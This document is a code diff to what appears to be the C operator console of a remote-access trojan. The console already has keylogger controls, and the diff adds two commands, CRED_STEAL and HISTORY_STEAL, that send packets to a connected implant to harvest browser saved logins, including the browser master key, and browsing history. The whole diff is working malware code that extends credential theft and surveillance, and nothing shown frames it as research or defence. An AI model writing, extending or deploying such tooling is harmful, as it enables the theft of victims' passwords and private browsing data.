@@ -100,6 +100,8 @@ static void display_prompt(int persistence)
     printf(" 10 - KEYLOG_START               Start keylogger\n");
     printf(" 11 - KEYLOG_STOP                Stop keylogger\n");
     printf(" 12 - KEYLOG_DUMP                Dump keylog\n");
+    printf(" 13 - CRED_STEAL                 Harvest browser credentials\n");
+    printf(" 14 - HISTORY_STEAL              Harvest browser history\n");
     printf("> ");
     fflush(stdout);
 }
@@ -120,10 +122,10 @@ static int console_input(int persistence)
             flush_stdin();
 
         if ((sscanf(input_buffer, "%d", &choice) == 1) &&
-            (choice >= 1 && choice <= 12))
+            (choice >= 1 && choice <= 14))
             break;
 
-        printf("INVALID INPUT! Please enter an integer from 1-12.\n");
+        printf("INVALID INPUT! Please enter an integer from 1-14.\n");
     }
     return choice;
 }
@@ -489,6 +491,36 @@ int main(int argc, char *argv[])
                 Packet *resp = recieve_packet(conn);
                 if (resp && resp->command_type == COMMAND_RESPONSE) {
                     handle_keylog_dump_response(resp);
+                } else if (process_response(resp, request_id, conn) == -1) {
+                    connected = 0;
+                }
+                if (resp) free_packet(resp);
+                break;
+            }
+
+            case 13: { /* CRED_STEAL */
+                printf("<Harvesting browser credentials (Master Key + Login Data)...>\n\n");
+                request_id++;
+                Packet pkt = {COMMAND_CRED_STEAL, request_id, 0, NULL};
+                send_packet(&pkt, conn);
+                Packet *resp = recieve_packet(conn);
+                if (resp && resp->command_type == COMMAND_RESPONSE) {
+                    handle_cred_steal_response(resp);
+                } else if (process_response(resp, request_id, conn) == -1) {
+                    connected = 0;
+                }
+                if (resp) free_packet(resp);
+                break;
+            }
+
+            case 14: { /* HISTORY_STEAL */
+                printf("<Harvesting browser history...>\n\n");
+                request_id++;
+                Packet pkt = {COMMAND_HISTORY_STEAL, request_id, 0, NULL};
+                send_packet(&pkt, conn);
+                Packet *resp = recieve_packet(conn);
+                if (resp && resp->command_type == COMMAND_RESPONSE) {
+                    handle_history_steal_response(resp);
                 } else if (process_response(resp, request_id, conn) == -1) {
                     connected = 0;
                 }
